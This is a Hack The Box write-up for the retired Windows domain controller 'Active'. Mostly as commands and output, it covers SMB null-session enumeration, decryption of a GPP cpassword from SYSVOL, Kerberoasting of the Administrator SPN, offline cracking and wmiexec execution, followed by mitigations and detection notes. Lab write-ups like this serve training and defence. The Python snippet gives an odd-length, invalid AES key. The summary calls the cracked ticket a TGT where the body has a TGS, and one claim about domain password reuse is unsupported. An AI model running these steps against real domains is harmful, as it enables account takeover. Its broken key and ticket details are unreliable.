---
machine: Active
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [ad, kerberos, gpp, smb, kerberoasting]
---

# Active — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials: they are replaced by placeholders.

## TL;DR

A Windows Server 2008 R2 domain controller (`active.htb`). SMB allows a null session and exposes a `Replication` share holding a copy of SYSVOL, including a `Groups.xml` with an encrypted GPP password. The AES key has been public since 2012 (MS14-025), so the password falls out immediately. That service account can then Kerberoast, and the SPN belongs to `Administrator`, so cracking the TGT hands over the top account in the domain.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
53/tcp    domain        Microsoft DNS
88/tcp    kerberos-sec  Microsoft Kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ldapssl
3268/tcp  ldap (Global Catalog)
49152+/tcp msrpc
```

A full DC profile: DNS, Kerberos, LDAP, SMB and RPC. There is no web or FTP, so the whole job is Active Directory.

```bash
echo "<IP> active.htb dc.active.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Null SMB session:

```bash
smbclient -L //<IP> -N
smbmap -H <IP>
```

Shares: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL` and **`Replication`**, which is not standard and smells like a manual copy of SYSVOL.

```bash
smbclient //<IP>/Replication -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Inside the policy:

```text
active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

```xml
<Properties action="U" ... userName="active.htb\SVC_TGS"
            cpassword="<cpassword>" ... />
```

GPP encrypts with AES-256 and a key Microsoft published; it is reversible, not a hash.

```bash
gpp-decrypt '<cpassword>'
```

Or in Python:

```python
from Crypto.Cipher import AES
import base64, binascii
key = binascii.unhexlify('4e9906e8edcdee15f9a8f0d1c2e3a4b5c6d7e8f90112233445566778899aabbccdd')
# PKCS7 padding, null IV, AES-CBC
```

Valid credential: `active.htb\SVC_TGS:<password>`.

## Foothold

No exposed service authenticates with that account, so it is used to request tickets:

```bash
GetUserSPNs.py active.htb/SVC_TGS:'<password>' -dc-ip <IP> -request
```

```text
ServicePrincipalName  Name           MemberOf  PasswordLastSet
--------------------  -------------  --------  ---------------
active/CIFS:445       Administrator            2018-07-18
```

The SPN belongs to `Administrator`, not to a service account. The TGS-REP is encrypted with its hash and cracks offline:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
# or
john hash.txt --format=krb5tgs --wordlist=rockyou.txt
```

## Escalation

None needed: the recovered password is `Administrator`'s. To run commands without an interactive session, `wmiexec` behaves better than `psexec` on 2008 R2 (the latter often trips over SMB signing and the temporary service):

```bash
wmiexec.py active.htb/Administrator:'<password>'@<IP>
```

```text
C:\> whoami
active\administrator
```

## Evidence

- `whoami` → `active\administrator`.
- `C:\Users\Administrator\Desktop\root.txt` read (contents redacted).
- Kerberos hash for `Administrator` in `$krb5tgs$23$` format (redacted).

## Lessons learned

- The oddly named share (`Replication`) was the tell: on a DC, any copy of SYSVOL outside `SYSVOL` is an operational mistake.
- GPP is not strong crypto, it is obfuscation with a known key. If `cpassword` shows up, the password is public.
- When Kerberoasting, look at **who** owns the SPN: if it is a privileged account, the ticket is worth more than a foothold.
- `psexec` fails often on 2008 R2; `wmiexec` avoids the temporary service and SMB signing.
- The GPP password was reused as a service account password and, at some point, as a domain one: reuse chains failures together.

## Mitigations and detection

- Remove `cpassword` from every GPO (MS14-025) and rotate any password that lived there.
- Move service accounts to gMSA, which have no password to extract.
- Disable RC4 in Kerberos and require AES: RC4 Kerberoasting is trivial to crack.
- Long, random service passwords; no dictionary words.
- Detection: event 4769 with `TicketEncryptionType 0x17`, bulk TGS requests from a single account, SYSVOL shares read from non-admin hosts.
- MITRE: T1552.006 (GPP), T1558.003 (Kerberoasting), T1078.

## References

- MS14-025: vulnerability in Group Policy preferences.
- MITRE ATT&CK: T1552.006, T1558.003.
- Impacket `GetUserSPNs.py` documentation.
